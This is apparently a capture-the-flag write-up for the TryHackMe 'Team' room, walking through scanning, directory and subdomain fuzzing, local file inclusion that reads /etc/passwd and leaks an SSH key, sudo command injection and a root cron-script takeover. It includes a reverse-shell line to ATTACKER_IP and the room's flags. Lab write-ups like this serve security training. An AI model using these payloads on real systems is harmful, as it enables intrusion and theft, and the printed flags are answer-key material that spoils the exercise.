# Team

Room: [https://tryhackme.com/room/teamcw](https://tryhackme.com/room/teamcw)

---

# Reconnaissance

First, I performed a port scan using **Nmap**.

```bash
nmap -sC -sV 10.48.172.72 -oN nmap.txt
```

### Scan Results

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.41
```

Open services:

* **FTP (21)**
* **SSH (22)**
* **HTTP (80)**

Since a web server was running, I began with **web enumeration**.

---

# Web Enumeration

Visiting the website showed the **Apache default page**.

While viewing the page source, I found the following message:

```
Apache2 Ubuntu Default Page: It works! If you see this add 'team.thm' to your hosts!
```

This indicates that the application uses a **virtual host**.

So I added it to my hosts file:

```bash
sudo nano /etc/hosts
```

```
10.48.172.72    team.thm
```

Then I accessed:

```
http://team.thm
```

---

# Directory Enumeration

Next, I used **Gobuster** to discover hidden directories.

```bash
gobuster dir -u http://team.thm/ -w /usr/share/wordlists/dirb/big.txt
```

### Result

```
assets
images
robots.txt
scripts
```

Checking `robots.txt` revealed:

```
dale
```

This could be a **username**.

---

# Script Enumeration

I then enumerated the `/scripts` directory using **ffuf**.

```bash
ffuf -w /usr/share/wordlists/dirb/common.txt \
-u http://team.thm/scripts/FUZZ \
-e .txt
```

### Result

```
script.txt
```

Opening the file revealed a **bash script** used to collect configuration files and download files from a local FTP server.

However, the credentials had been removed.

At the bottom of the script there was a hint:

```
Note to self had to change the extension of the old "script" in this folder, as it has creds in
```

---

# Discovering Credentials

I searched again for hidden files with additional extensions.

```bash
ffuf -w /usr/share/wordlists/dirb/common.txt \
-u http://team.thm/scripts/FUZZ \
-e .txt,.bak,.old,.backup
```

### Result

```
script.old
```

Downloading and inspecting `script.old` revealed **FTP credentials**.

---

# FTP Access

Using the discovered credentials, I connected to the FTP server.

```bash
ftp 10.48.172.72
```

After logging in, I found a directory:

```
workshare
```

Inside the directory:

```
New_site.txt
```

I downloaded the file.

```bash
get New_site.txt
```

### File Contents

```
Dale
I have started coding a new website in PHP for the team to use, this is currently under development.
It can be found at ".dev" within our domain.

Also as per the team policy please make a copy of your "id_rsa" and place this in the relevant config file.

Gyles
```

This revealed a **new subdomain**.

---

# Subdomain Enumeration

I used **ffuf** to brute-force subdomains.

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-u http://team.thm \
-H "Host: FUZZ.team.thm" \
-ac
```

### Result

```
dev.team.thm
```

---

# Local File Inclusion (LFI)

So I added it to my hosts file:

```bash
sudo nano /etc/hosts
```

```
10.48.172.72    team.thm dev.team.thm
```

Then Navigating to:

```
http://dev.team.thm
```

I discovered a vulnerable parameter:

```
script.php?page=
```
Since the application uses a page parameter to load content, I attempted Local File Inclusion using directory traversal.

```
http://dev.team.thm/script.php?page=../../../etc/passwd
```

The server returned the contents of `/etc/passwd`, confirming the **LFI vulnerability**.

---

# LFI File Enumeration

To discover sensitive files, I used **Burp Intruder** with the following request:

```
GET /script.php?page=§../../../etc/passwd§ HTTP/1.1
Host: dev.team.thm
```

I replaced the path with a payload position and used the wordlist:

```
seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
```

One of the responses revealed an **SSH private key**.

---

# SSH Access

Using the discovered key, I logged in as **dale**.

```bash
ssh -i id_rsa dale@10.48.172.72
```

Login was successful.

---

# User Flag

Listing the home directory:

```bash
ls
```

```
user.txt
```

Reading the file:

```bash
cat user.txt
```

```
THM{6Y0TXHz7c2d}
```

---

# Privilege Escalation

Checking sudo permissions:

```bash
sudo -l
```

Output:

```
User dale may run the following commands on this host:
(gyles) NOPASSWD: /home/gyles/admin_checks
```

This means **dale can run the script as user gyles**.

Running the script:

```bash
sudo -u gyles /home/gyles/admin_checks
```

The script allowed command injection through user input, which enabled spawning a shell as **gyles**.

---

# Enumerating as Gyles

After gaining a shell as **gyles**, I inspected the user's command history.

```bash
cat ~/.bash_history
```

The history revealed references to backup scripts.

One interesting file was:

```
/usr/local/bin/main_backup.sh
```

Viewing the script:

```bash
cat /usr/local/bin/main_backup.sh
```

```
#!/bin/bash

cp -r /var/www/team.thm/* /var/backups/www/team.thm/
```

Checking permissions:

```
-rwxrwxr-x 1 root admin main_backup.sh
```

This means:

* Owner → root
* Group → admin (write access)

The user **gyles belongs to the admin group**, allowing modification of this script.

---

# Root Shell via Cronjob

Since the script is executed automatically (via cron), I modified it to include a reverse shell.

First, I started a listener on my machine:

```bash
nc -lvnp 4444
```

Then edited the script:

```bash
nano /usr/local/bin/main_backup.sh
```

Modified script:

```bash
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

After waiting a few seconds for the cron job to run, I received a connection.

Checking privileges:

```bash
whoami
```

```
root
```

---

# Root Flag

Reading the root flag:

```bash
cat /root/root.txt
```

```
THM{fhqbznavfonq}
```

DONE!!!!!!!
